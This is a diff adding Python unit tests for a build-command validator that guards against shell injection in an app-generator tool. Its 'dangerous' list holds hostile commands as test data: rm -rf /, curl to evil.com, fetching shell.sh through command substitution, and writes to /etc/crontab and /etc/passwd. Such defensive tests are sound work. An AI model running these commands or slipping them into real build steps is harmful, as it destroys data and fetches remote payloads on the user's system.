@@ -545,3 +545,48 @@ def test_validate_wiring_tool_annotations_are_runtime_resolved() -> None:
 
     assert validate_wiring.__annotations__["context_variables"] != "Optional[Dict[str, Any]]"
 
+
+# ---------------------------------------------------------------------------
+# _is_safe_build_command: shell injection guard
+# ---------------------------------------------------------------------------
+
+def test_is_safe_build_command_accepts_standard_build_commands() -> None:
+    from factory_app.workflows.AppGenerator.tools.app_validation import _is_safe_build_command
+
+    safe = [
+        "npm install",
+        "npm run build",
+        "npm test -- --watchAll=false",
+        "python -m pytest",
+        "yarn build",
+        "node scripts/build.js",
+        "pip install -r requirements.txt",
+    ]
+    for cmd in safe:
+        assert _is_safe_build_command(cmd), f"Expected safe, got rejected: {cmd!r}"
+
+
+def test_is_safe_build_command_rejects_shell_metacharacters() -> None:
+    from factory_app.workflows.AppGenerator.tools.app_validation import _is_safe_build_command
+
+    dangerous = [
+        "npm install; rm -rf /",
+        "npm run build && curl http://evil.com",
+        "npm test | tee /etc/passwd",
+        "npm install || echo pwned",
+        "`rm -rf /`",
+        "$(curl http://evil.com/shell.sh)",
+        "npm run build > /etc/crontab",
+        "cat /etc/passwd < /dev/null",
+        "npm install\x00; evil",
+    ]
+    for cmd in dangerous:
+        assert not _is_safe_build_command(cmd), f"Expected rejected, got accepted: {cmd!r}"
+
+
+def test_is_safe_build_command_rejects_empty_and_null() -> None:
+    from factory_app.workflows.AppGenerator.tools.app_validation import _is_safe_build_command
+
+    assert not _is_safe_build_command("")
+    assert not _is_safe_build_command("\x00")
+
